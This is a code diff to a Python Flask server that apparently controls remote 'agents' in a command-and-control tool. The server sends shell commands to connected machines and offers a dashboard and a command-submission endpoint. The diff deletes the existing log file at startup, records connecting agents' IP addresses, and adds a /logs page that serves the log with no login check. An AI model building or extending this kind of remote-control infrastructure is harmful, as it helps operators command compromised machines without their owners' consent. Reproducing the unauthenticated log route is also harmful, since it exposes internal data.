@@ -19,6 +19,8 @@ log.disabled = True
 
 # Set up server logging
 logger = logging.getLogger(__name__)
+if os.path.exists("server.log"):
+    os.remove("server.log")
 logging.basicConfig(filename='server.log', encoding='utf-8', format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)
 
 # Keep track of registered agents
@@ -40,7 +42,7 @@ def handle_client(client_socket, client_address):
         try:
             # Get hostname
             command = "hostname" + "\n"
-            logging.info(f"[+] New agent connected. Getting hostname...")
+            logging.info(f"[+] New agent connected ({client_address[0]}). Getting hostname...")
             client_socket.sendall(command.encode())
 
             # Receive output from the client until the delimiter
@@ -144,10 +146,24 @@ def login():
 @app.route('/dashboard')
 def dashboard():
     if 'username' not in session:
-        flash('Please log in to access the dashboard.', 'warning')
+        flash('Please log in first.', 'warning')
         return redirect(url_for('login'))
     return render_template('dashboard.html', username=session['username'], agents=registered_agents_id[1:])
 
+@app.route('/logs')
+def logs():
+    # Specify the path to your log file
+    log_file_path = 'server.log'
+
+    # Read the contents of the log file
+    try:
+        with open(log_file_path, 'r') as file:
+            log_content = file.readlines()
+    except FileNotFoundError:
+        log_content = ["Log file not found."]
+
+    # Render the log contents in the HTML template
+    return render_template('logs.html', log_content=log_content)
 
 @app.route('/submit_command', methods=['POST'])
 def submit_command():
